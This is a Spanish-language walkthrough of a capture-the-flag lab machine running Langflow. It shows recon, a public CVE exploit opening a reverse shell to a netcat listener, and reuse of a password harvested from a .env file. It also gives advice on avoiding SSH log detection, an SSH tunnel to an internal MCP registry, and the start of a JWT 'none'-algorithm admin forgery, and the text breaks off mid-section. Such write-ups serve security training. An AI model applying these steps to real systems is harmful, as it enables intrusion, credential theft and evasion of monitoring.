# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv $IP

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

```bash
sudo nmap -p22,443 -Pn -n -sVC --min-rate 5000 -oN versiones $IP

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: Did not follow redirect to https://fireflow.htb/
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## <font color=red>[~]</font> Entorno web

En el escaneo de `nmap` podemos ver que el servidor web que corre en el puerto `443`, usa el protocolo ***HTTPS*** con ***NGINX***. Además, vemos que la página nos redirige a `https://fireflow.htb`, lo que significa que el servidor web está configurado con ***VHosts*** y deberemos de añadir la IP con su dominio en el archivo `/etc/hosts` para poder acceder a él.

```bash
echo "$IP fireflow.htb" | sudo tee -a /etc/hosts
```

>Ahora podremos acceder al sitio web en `https://fireflow.htb` ya sea desde el navegador o con herramientas como `curl`.

### <font color=red>[-]</font> Certificado SSL/TLS

>Cuando tratamos con páginas web sobre HTTPS, es una buena práctica mirar el certificado para ver si hay información útil (*como posibles subdominios que se reconocen bajo el mismo certificado*).

Si miramos el certificado de la web, encontramos que este certificado es válido para el dominio `fireflow.htb` y para cualquier subdominio posible `*.fireflow.htb`. Lo que significa que es posible que el dominio cuente con ***subdominios***.

```
Subject Alt Names

	DNS Name    fireflow.htb
	DNS Name    *.fireflow.htb
```

### <font color=red>[-]</font> Subdominio `flow.fireflow.htb`

Si miramos el código fuente de la página encontramos que el botón de `Open Agent` nos redirige a un subdominio `flow.fireflow.htb`.

>[!important]
>*Para poder acceder a dicho subdominio, será necesario añadirlo en el archivo `/etc/hosts`.*

Una vez que tenemos el subdominio apuntando a la IP en el archivo `/etc/hosts`, si pulsamos sobre el botón `Open Agent`, se nos redirige a lo que parece un chat de una inteligencia artificial en la ruta `/playground/<UUID>`. No obstante, no importa que le preguntemos, siempre responde lo mismo:

```
We are extremely sorry, this is still under development. Please, check back soon...
```

>[!Note]
>Otra forma de descubrir la existencia del subdominio `flow.fireflow.htb` es mirando las cabeceras HTTP cuando realizamos una petición a `fireflow.htb`:
>
>```HTTP
>HTTP/1.1 200 OK
>Server: nginx
>Date: Wed, 02 Sep 2026 08:29:20 GMT
>Content-Type: text/html
>Content-Length: 12913
>Last-Modified: Thu, 30 Apr 2026 09:55:55 GMT
>Connection: keep-alive
>ETag: "69f3272b-3271"
>X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
>X-Content-Type-Options: nosniff
>Referrer-Policy: strict-origin-when-cross-origin
>Accept-Ranges: bytes
>```
>
>Aquí podemos ver como la cabecera `X-Frame-Options` nos muestra la existencia de dicho subdominio.

#### <font color=red>[-]</font> Fuzzing

Debido a que tenemos un subdominio que posiblemente tenga vectores de ataque, podemos realizar *fuzzing web* para tratar de obtener más *endpoitns* que pueden contener más información de la aplicación.

```bash
ffuf -c -w <(tail -n+15 /usr/share/seclists/Discovery/Wev-Content/DirBuster-2007_directory-list-2.3-big.txt) -u https://flow.fireflow.htb/FUZZ -fc 404
```

Si usamos este comando, se nos mostrará mucho ruido ya que el subdominio está configurado para responder con una respuesta genérica a cualquier ruta. De hecho, si navegamos hacia un *endpoint* que no exista, obtendremos un panel de *login* de una app llamada `Langflow`.

Para que el escaneo con `ffuf` debemos filtrar también por el peso de las respuestas, ya que la misma página devuelve el mismo tamaño de respuesta.

```bash
ffuf -c -w <(tail -n+15 /usr/share/seclists/Discovery/Wev-Content/DirBuster-2007_directory-list-2.3-big.txt) -u https://flow.fireflow.htb/FUZZ -fc 404 -fs 1142

docs                    [Status: 200, Size: 1007, Words: 157, Lines: 32, Duration: 101ms]
health                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 104ms]
logs                    [Status: 403, Size: 51, Words: 4, Lines: 1, Duration: 417ms]
redoc                   [Status: 200, Size: 889, Words: 176, Lines: 31, Duration: 181ms]
```

#### <font color=red>[-]</font> Enumeración de la API y Evasión de CSP

Encontramos 4 *endpoints*, los cuales tienen bastante información. Pero el que encuentro más interesante es `docs`:

>En aplicaciones modernas, esta ruta suele alojar la interfaz de ***Swagger UI*** para documentar la API.

Al realizar la petición, el servidor devolvió el siguiente código fuente:

```HTML
curl -s "https://flow.fireflow.htb/docs" -k -i

<!--
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 02 Sep 2026 08:44:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1142
Connection: keep-alive
accept-ranges: bytes
last-modified: Thu, 09 Apr 2026 14:40:25 GMT
etag: "bedd57dea1597fb0c876f02c5a4b2124"
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;
-->

    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>Langflow - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

Del análisis de esta respuesta extraemos información clave sobre la arquitectura del *backend*:

- ***Identificación del software:*** En la etiqueta `<title>` podemos ver el nombre del software ***Langflow***.
- ***Framework utilizado:*** El favicon (`fastapi.tiangolo.com`) es una firma por defecto que delata el uso del framework ***FastAPI*** (basado en Python).
- ***Proxy Inverso:*** La cabecera `Server: nginx` confirma el uso de ***Nginx*** como intermediario.

No obstante, cuando tratamos de acceder a la ***Swagger UI*** en `/docs` nos encontramos con que la página no carga (***[Explicación](#el_problema_de_la_página_en_blanco)***). Para sortear este problema visual, revisamos el código JavaScript embebido en la respuesta y localizamos la ruta de donde la interfaz gráfica intentaba extraer los datos: `url: /openapi.json`.

Navegando directamente al *endpoint* `/openapi.json`, logramos descargar la especificación cruda de la API, obteniendo así el mapa completo de rutas y la versión exacta del software. No obstante, para poder leer el contenido de dicho *endpoint* es recomendable usar herramientas como `jq` para embellecer la salida, o incluso podemos usar herramientas web para poder ver el contenido en una interfaz gráfica.

*Ejemplo de salida con [editor.swagger.io](https://editor.swagger.io/)*

![[imagen de fireflow.png]]

### <font color=red>[-]</font> Langflow

Cuando miramos la salida de `/openapi.json` vemos que el título de la documentación de la API es ***Langflow***. Este nombre también lo vimos en el etiqueta `<title>` del *endpoint* `/docs`. Y, a decir verdad, aparece en el HTML por defecto al buscar una ruta que no existe.

###### Pero qué es ***Langflow***?

***Lagflow*** es una plataforma de código abierto diseñada para construir ***flujos de trabajo de Inteligencia Artificial*** (especialmente aplicaciones basadas en LLMs o Grandes Modelos de Lenguaje). Su característica principal es que proporciona una interfaz gráfica de "arrastar y soltar" (*drag-and-drop*), permitiendo a los desarrolladores y analistas conectar modelos de IA, bases de datos, APIs externas y herramientas de búsqueda sin necesidad de escribir código complejo.

A nivel interno, la plataforma funciona de la siguiente manera:

- ***Backend:*** Está desarrollado en **Python**, utilizando el framework ***FastAPI*** para gestionar las rutas y la comunicación de la API.
- ***Gestión de proyectos (Flujos):*** Cada entorno de trabajo o cadena de IA creada por el usuario se denomina "flow" y se identifica internamente mediante identificadores únicos universales (***UUID***), conocidos como `flow_id`.
- ***Ejecución:*** Al ser una herramienta diseñada para conectar componentes y ejecutar lógica de IA, el *backend* tiene que interpretar y ejecutar dinámicamente configuraciones, cadenas de texto y, en ocasiones, scripts proporcionados por el usuario.

>[!warning]
>*Saber que nos enfrentamos a Langflow (y que está construido con Python/FastAPI) nos indica que la aplicación maneja constantemente la **interpretación de datos dinámicos**. En este tipo de plataformas, si la validación de los datos de entrada (_input sanitization_) no es estricta, la línea entre "configurar un flujo de IA" e "inyectar código malicioso en el sistema operativo subyacente" puede volverse muy fina, abriendo vectores potenciales de ejecución remota de comandos.*

Mirando el *endpoint* `/openapi.json` descubrimos que la aplicación corre bajo la versión `1.8.2`. Si buscamos vulnerabilidades sobre esta versión encontramos un ***RCE crítico (CVE-2026-33017 | [Explicación](#cve-2026-33017)***.

Para poder explotar la vulnerabilidad, podemos usar un *exploit* público como el del siguiente [Repositorio de GitHub](https://github.com/EQSTLab/CVE-2026-33017).

# <font color=red>[+]</font> Explotación

Primero debemos clonar el repositorio de GitHub en nuestra máquina local con el comando `git clone https://github.com/EQSTLab/CVE-2026-33017`. Una vez tengamos el repositorio clonado, debemos entrar al directorio y ejecutar el código de la siguiente forma:

```bash
# 1. Levantamos el listener
nc -lvnp 4444

# 2. Eejcutamos el exploit
python3 exploit.py --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost IP_KALI --lport 4444

[*] Request returned no response (expected if shell connected): HTTPSConnectionPool(host='flow.fireflow.htb', port=443): Max retries exceeded with url: /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1033)')))
```

Se nos mostrará este mensaje en el que se nos dice que ha habido un error relacionado con el certificado SSL. Recordemos que el certificado SSL/TLS del servidor es autofirmado, por lo que el módulo `request` del código fallará a la hora de validar el certificado y cancelará la conexión.

Para solucionarlo tan solo debemos modificar el código para añadir a los parámetros de la conexión que no se valide el certificado SSL/TLS.

```Python
def send_payload():
    print(f"[*] Target: {endpoint}")
    print(f"[*] Callback: {args.lhost}:{args.lport}")
    try:
        resp = requests.post(
            endpoint,
            json=build_payload(args.lhost, args.lport),
            cookies={"client_id": "poc"},
            timeout=args.timeout,
            verify = False,  # Aquí le indicamos que no verifique el certificado
        )
        print(f"[*] HTTP {resp.status_code}")
    except requests.RequestException as e:
        print(f"[*] Request returned no response (expected if shell connected): {e}")
```

>Una vez solucionado el problema, obtendremos una reverse shell.

# <font color=red>[+]</font> Post-Explotación

## <font color=red>[~]</font> Upgrading Shell

Una vez dentro del sistema, deberemos de mejorar nuestra shell. Ya que la que obtenemos inicialmente, como la que obtenemos la mayoría de las veces a través de una reverse shell, es bastante limitada e incómoda.

### Para mejorar nuestra shell

1. Forzamos al sistema a asignar un ***pseudo-terminal (PTY)*** interactivo a una nueva sesión de Bash, descartando el archivo de grabación de la herramientas en la nada (`/dev/null`).
   
   ```bash
   script -c bash /dev/null
   ```
   
   Esto transforma  una *reverse shell* básica y limitada en una consola funcional, permitiéndonos ejecutar herramientas que exigen una terminal real (como `su` o `sudo` o editores de texto).
2. Ahora volvemos a nuestra máquina atacante usando la combinación de teclas `CTRL+Z` y le indicaremos a nuestra terminal local que envíe todas nuestras pulsaciones "*en crudo*" a la víctima, lo que nos permite usar atajos como `CTRL+C` o las flechas de dirección sin matar la conexión.
   
   ```bash
   # CTRL+Z
   stty raw -echo ; fg
   ```
   
   El comando `; fg` (*foregroung*) simplemente trae de vuelta a primer plano el *listener* de netcat que habíamos pausado previamente con `CTRL+Z`.
1. Definimos la variable de entorno que le indica al sistema víctima qué tipo de emulador de terminal estamos utilizando.
   
   ```bash
   export TERM=xterm
   ```
   
   Esto habilita el renderizado correcto de la pantalla, permitiéndonos usar la limpieza de consola ( `clear`), ver colores y manejar editores de texto interactivos como `nano` o `vim`.
1. Por último, le indicamos a la terminal de la víctima las dimensiones exactas (filas y columnas) de nuestra ventana local.
   
   ```bash
   # En nuestra máquina atacante
   stty -a
   speed 38400 baud; rows 36; columns 172; line = 0;
   
   # En la máquina víctima
   stty rows 36 columns 172
   ```
   
   Esto sincroniza el tamaño del entorno, evitando que los comandos largos se superpongan o que la interfaz se rompa al visualizar archivos grandes o usar editores de texto.

## <font color=red>[~]</font> Escalada de privilegios a `nightfall` 

Tras investigar en el sistema, encontramos que existe un archivo de variables de entorno de la aplicación web ***Langflow*** (podemos descubrirla investigando en el directorio `/etc`, usando el comando `find / -name ".env" 2>/dev/null` o herramientas como `linpeas.sh`).

Dentro del archivo, encontramos unas credenciales para la aplicación web ***Langflow***. No obstante, puede ser que la contraseña haya sido reutilizada por alguno de los usuarios del sistema, por lo que tratemos de usarla para cambiar de usuario:

1. Veamos que usuarios existen en el sistema:
   
   ```bash
   awk -F: '$7 ~ /sh|bash/' /etc/passwd
   
   root:x:0:0:root:/root:/bin/bash
   nightfall:x:1000:1000::/home/nightfall:/bin/bash
   ```
   
   Tan solo existen dos usuarios con shell `bash`, y una de ellas es peligrosamente parecida a la contraseña que hemos encontrado.
1. Para ver si realmente podemos conectarnos podemos usar el comando `su`:
   
   ```bash
   su nightfall
   ```
   
   Y conseguimos cambiar al usuario `nightfall`

2. Miremos en el archivo de configuración de SSH si es posible conectarse vía este protocolo usando contraseñas. Para ello podemos buscar la directiva `PasswordAuthentication` en el archivo de configuración `/etc/ssh/sshd_config`.
   
   ```bash
   grep -i "PasswordAuthentication" /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf
   
   /etc/ssh/sshd_config:#PasswordAuthentication yes
   ```
   
   Vemos que la línea está comentada, por lo que es posible conectarse vía SSH usando contraseñas (el valor por defecto es *permitido*).
2. Una vez sabemos que podemos tratar de conectarnos vía SSH usando contraseñas, nos conectamos aprovechando el protocolo:
   
   ```bash
   ssh nightfall@$IP
   ```

>[!important]
>***Por qué hemos usado `su` si después íbamos a conectarnos por ssh?***
>
>*La realidad es que los logs de SSH son lo primero que mira un administrador de sistemas por varias razones:*
>
>1. ***Es el vector de ataque #1*** *-  los intentos de brute-force por SSH son el evento de seguridad más frecuente en cualquier servidor expuesto.*
>2. ***Es la puerta de entrada principal*** * - si alguien accede de forma no autorizada, lo más probable es que haya entrado por SSH.*
>3. ***Volumen de ruido*** *- un servidor con puerto 22 abierto puede recibir miles de intentos fallidos al día, lo que obliga a monitorearlo constantemente.*
>   
>*De esta forma, un administrador de sistemas muchas veces buscará ruido de IPs trtando de conectarse sin éxito (patron de fuerza bruta), pero alguien que se ha conectado directamente sin error al iniciar sesión, lo más seguro es que haya sido el mismo usuario.*

## <font color=red>[~]</font> MCP

>[!important]
>Dentro del directorio personal del usuario `nightfall` encontramos un subdirectorio oculto `.mcp`.

Este directorio está relacionado con el ***Model Context Protocol (MCP)***, el cual es un estándar abierto diseñado para que las aplicaciones de Inteligencia Artificial se conecten de forma segura y estandarizada a fuentes de datos externas, bases de datos o herramientas locales. Los desarrolladores o administradores lo utilizan para guardar los archivos de configuración (generalmente en formato JSON) que le indican a la IA dónde están los servidores con los que tiene que hablar y qué credenciales debe usar.

Cuando miramos dentro de `~/.mcp` encontramos un archivo `config.json`, cuyo contenido es:

```JSON
{
  "server": "http://10.129.87.10:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

En este archivo de configuración encontramos un nuevo servidor que corre en el puerto `30080`. Sin embargo, si miramos los puertos a la escucha en la máquina no veremos el puerto (***[Explicación](#puerto_30080***).

### <font color=red>[-]</font> Descubrimiento de la Superficie de Ataque y Fallo en JWT

Al interactuar con la API del servicio interno (`http://$IP:30080.api/v1/version`), el servidor devolvió un objeto JSON con sus metadatos de configuración.

```JSON
// curl -s http://$IP:30080/api/v1/version -w "\n" | jq

{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": [
      "HS256",
      "none"
    ]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

>Este tipo de respuestas (*Information Disclosure*) son vitales en una auditoría, ya que el sistema nos está entregando voluntariamente el mapa de sus propias debilidades.

#### <font color=red>[-]</font> En esta salida encontramos tres vectores clave

###### 1. Vulnerabilidad Crítica de Autenticación (JWT "none" algorithm)

El hallazgo más preocupante en el bloque `"auth"`. El servidor indica que utiliza tokens JWT y soporta dos algoritmos de firma: `HS256` y `none`.

>[!warning]
>*El soporte del algoritmo `none` es un fallo clásico y crítico de implementación. Permite a un atacante fabricar su propio token JWT con reclamaciones (*claims*) de administrador, indicar en la cabecera que no utiliza firma criptográfica ( `"alg": "none"`), y el *backend* lo procesará como totalmente válido, logrando un *bypass* de autenticación completo.*

###### 2. Identificación del Objetivo Privilegiado

La lista de `"endpoints"` revela claramente dónde debemos utilizar nuestro token falsificado. La ruta `POST /api/v1/tools [admin]` requiere privilegios de administrador. Como atacantes, esto nos indica el punto exacto donde podemos manipular el registro de herramientas del sistema.

###### 3. Pivote hacia la Documentación

La línea `"docs": "/docs"` justifica dentro de la cadena de ataque cómo descubrimos la estructura exacta de los parámetros de la API.

```HTML
<!-- curl -s http://localhost:30080/docs -->

    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>MCP AI Tool Registry — Task Force Nightfall - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

Nos confirma que este microservicio tiene su propia interfaz Swagger alojada internamente, independientemente de la principal de *Langflow*.

#### <font color=red>[-]</font> Documentación

Si miramos las cabeceras de la respuesta HTTP, veremos que esta vez no encontramos la limitación de la cabecera `Content-Security-Policy`, por lo que si navegamos al *endpoint* `/docs` desde un navegador seremos capaces de ver la documentación con una interfaz gráfica. No obstante, este microservicio corre únicamente desde la máquina víctima a través del puerto `30080` y no podemos acceder a ella directamente des nuestra máquina local.

Por otro lado, podemos crear un túnel SSH para redirigir todo el tráfico del puerto `30080` de la víctima a nuestro puerto `30080` y así poder obtener acceso al microservicio a través de nuestro navegador en nuestra máquina atacante.

```bash
# En nuestra máquina atacante
ssh -L 30080:127.0.0.1:30080 nightfall@fireflow.htb

# Una vez creado el túnel SSH, abrimos nuestro navegador e intractuamos con el endpoint
firefox http://127.0.0.1:30080/docs
```

De esta forma podremos ver la documentación en el archivo `/openapi.json` de una forma gráfica. Aunque si preferimos no abrir el túnel SSH, podemos ver esta información en formato JSON desde la terminal usando la herramienta `jq`:

```JSON
// En la máquina víctima
//curl -s http://127.0.0.1:30080/openapi.json | jq

{
  "openapi": "3.1.0",
  "info": {
    "title": "MCP AI Tool Registry — Task Force Nightfall",
    "version": "0.1.0"
  },
  "paths": {
    "/api/v1/version": {
      "get": {
        "summary": "Version",
        "operationId": "version_api_v1_version_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {
                  "additionalProperties": true,
                  "type": "object",
                  "title": "Response Version Api V1 Version Get"
                }
              }
            }
          }
        }
      }
    },
    "/api/v1/auth": {
      "post": {
        "summary": "Authenticate",
        "operationId": "authenticate_api_v1_auth_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/AuthRequest"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {
                  "additionalProperties": {
                    "type": "string"
                  },
                  "type": "object",
                  "title": "Response Authenticate Api V1 Auth Post"
                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/api/v1/tools": {
      "get": {
        "summary": "List Tools",
        "operationId": "list_tools_api_v1_tools_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {
                  "items": {},
                  "type": "array",
                  "title": "Response List Tools Api V1 Tools Get"
                }
              }
            }
          }
        }
      },
      "post": {
        "summary": "Register Tool",
        "operationId": "register_tool_api_v1_tools_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/ToolRegisterRequest"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {
                  "additionalProperties": {
                    "type": "string"
                  },
                  "type": "object",
                  "title": "Response Register Tool Api V1 Tools Post"
                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        },
        "security": [
          {
            "HTTPBearer": []
          }
        ]
      }
    },
    "/mcp": {
      "post": {
        "summary": "Mcp Endpoint",
        "operationId": "mcp_endpoint_mcp_post",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        },
        "security": [
          {
            "HTTPBearer": []
          }
        ]
      }
    }
  },
  "components": {
    "schemas": {
      "AuthRequest": {
        "properties": {
          "username": {
            "type": "string",
            "title": "Username"
          },
          "password": {
            "type": "string",
            "title": "Password"
          }
        },
        "type": "object",
        "required": [
          "username",
          "password"
        ],
        "title": "AuthRequest"
      },
      "HTTPValidationError": {
        "properties": {
          "detail": {
            "items": {
              "$ref": "#/components/schemas/ValidationError"
            },
            "type": "array",
            "title": "Detail"
          }
        },
        "type": "object",
        "title": "HTTPValidationError"
      },
      "ToolRegisterRequest": {
        "properties": {
          "name": {
            "type": "string",
            "title": "Name"
          },
          "description": {
            "type": "string",
            "title": "Description"
          },
          "inputSchema": {
            "anyOf": [
              {
                "additionalProperties": true,
                "type": "object"
              },
              {
                "type": "null"
              }
            ],
            "title": "Inputschema"
          },
          "code": {
            "type": "string",
            "title": "Code"
          }
        },
        "type": "object",
        "required": [
          "name",
          "description",
          "code"
        ],
        "title": "ToolRegisterRequest"
      },
      "ValidationError": {
        "properties": {
          "loc": {
            "items": {
              "anyOf": [
                {
                  "type": "string"
                },
                {
                  "type": "integer"
                }
              ]
            },
            "type": "array",
            "title": "Location"
          },
          "msg": {
            "type": "string",
            "title": "Message"
          },
          "type": {
            "type": "string",
            "title": "Error Type"
          },
          "input": {
            "title": "Input"
          },
          "ctx": {
            "type": "object",
            "title": "Context"
          }
        },
        "type": "object",
        "required": [
          "loc",
          "msg",
          "type"
        ],
        "title": "ValidationError"
      }
    },
    "securitySchemes": {
      "HTTPBearer": {
        "type": "http",
        "scheme": "bearer"
      }
    }
  }
}
```

Viendo esta información podemos crear las peticiones necesarias para iniciar sesión con el usuario de la cuenta de configuración que encontramos en `~/.mcp/config.json` y registrar herramientas nuevas.

#### <font color=red>[-]</font> Obtención de JWT y explotación de JWT none algorithm

Primero debemos iniciar sesión con las credenciales que obtuvimos antes a través del *API endpoint* ` POST /api/v1/auth`.

Viendo la documentación `/openapi.json` vemos que requiere de dos campos obligatorios (`username` y `password`). Por lo que vamos a tratar de realizar una petición POST con estos campos al *endpoint*:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/auth -d "username=langflow-bot&password=Langfl0w@mcp2026!" -i 

HTTP/1.1 422 Unprocessable Entity
date: Thu, 03 Sep 2026 15:26:32 GMT
server: uvicorn
content-length: 195
content-type: application/json

{"detail":[{"type":"model_attributes_type","loc":["body"],"msg":"Input should be a valid dictionary or object to extract fields from","input":"username=langflow-bot&password=Langfl0w@mcp2026!"}]}
```

Se nos indica que la entrada (*usuario y contrsaseña*) deben ser una diccionario u objeto válido del que poder extraer los campos. Esto se refiere a que hemos usado el formato `x-www-form-urlencoded` cuando la aplicación espera un JSON. Para mandar los campos en formato JSON hacemos lo siguiente:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
> -H "content-Type: application/json" \  # Especificamos que usaremos json
> -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' -i

HTTP/1.1 200 OK
date: Thu, 03 Sep 2026 15:30:32 GMT
server: uvicorn
content-length: 170
content-type: application/json

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

Acabamos de obtener el JWT que almacena la información de nuestra sesión. No obstante, hemos visto (en `/api/v1/version`) que para usar los *API endpoints* críticos como `POST /api/v1/tools` necesitamos ser administradores del microservicio. Por lo que debemos confirma que nuestro usuario tiene estos permisos.

##### <font color=red>[>]</font> Desglose de JWT

Al final, un JWT (JSON Web Token) no es más que información codificada en Base64Url que representa nuestra sesión o identidad dentro de una aplicación. No está encriptado, simplemente codificado, lo que significa que cualquiera que intercepta o posea el token puede decodificarlo y leer su contenido sin necesidad de contraseñas.

Visualmente, un JWT es una cadena de texto continua dividida en tres partes separadas por un punto (`.`):

```bash
Cabecera.Payload.Firma    # o en inglés --> Header.Payload.Signature
```

- ***Cabecera (Header):*** Un JSON que define el tipo de token y el ***algoritmo criptográfico*** utilizado para protegerlo.
- ***Payload:*** El JSON que contiene las afirmaciones (*claims*) sobre el usuario. Aquí residen los datos de la sesión que el servidor necesita leer, ocmo el nombre de usuario, su nivel de privilegios (`{"role":"admin"}`) y la fecha de expiración.
- ***Firma (Signature):*** Es el mecanismo de integridad. El servidor toma la Cabecera, el Payload y una clave secreta interna para generar un hash matemático. su propósito es evitar manipulaciones si un usuario estándar cambia su *Payload* a `"role":"admin"`, el hash de la firma ya no coincidirá con los datos modificados y el servidor rechazará la petición.

##### <font color=red>[>]</font> Generación del nuevo JWT

El fallo de diseño al soportar el algoritmo `none` en la Cabecera radica en que le permite al cliente desactivar completamente la validación de la firma. Esto rompe el modelo de confianza del JWT, permitiendo a un atacante modificar el *payload* para elevar sus privilegios sin que el *backend* tenga forma de detectar la manipulación.

>[!Note]
>*El algoritmo `none` se incluyó originalmente en el estándar JWT para optimizar el rendimiento en entornos donde la seguridad ya está garantizada por otro mecanismo (como una red interna totalmente aislada o un túnel TLS mutuamente autenticado (mTLS)). En esos casos muy específicos, se permite prescindir de la firma criptográfica para ahorrar recursos de procesamiento asumiendo erróneamente que es imposible que un atacante intercepte o altere el token en tránsito.*

###### Nuestro JWT actual

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps
```

Vayamos decodificando cada sección del JWT para ver la información que almacena:

```bash
# Cabecera
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f1 | base64 -d

{"alg":"HS256","typ":"JWT"}

# Payload
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f2 | base64 -d

{"sub":"langflow-bot","role":"user"}

# Firma
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f3

RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps
```

###### Cabecera

En la cabecera encontramos que el JWT está generado para que se compruebe su identidad con el algoritmo criptográfico `HS256`. No obstante, nosotros podemos cambiarlo a `none`.

###### Payload

En el *payload* vemos que nuestro usuario actual tiene el rol `user`. Necesitamos cambiarlo a `admin`.

###### Construcción del nuevo JWT

Tenemos varias forma de generar este nuevo JWT:

1. ***Python***
 Podemos usar Python para generar el nuevo JWT a través de código:

```python
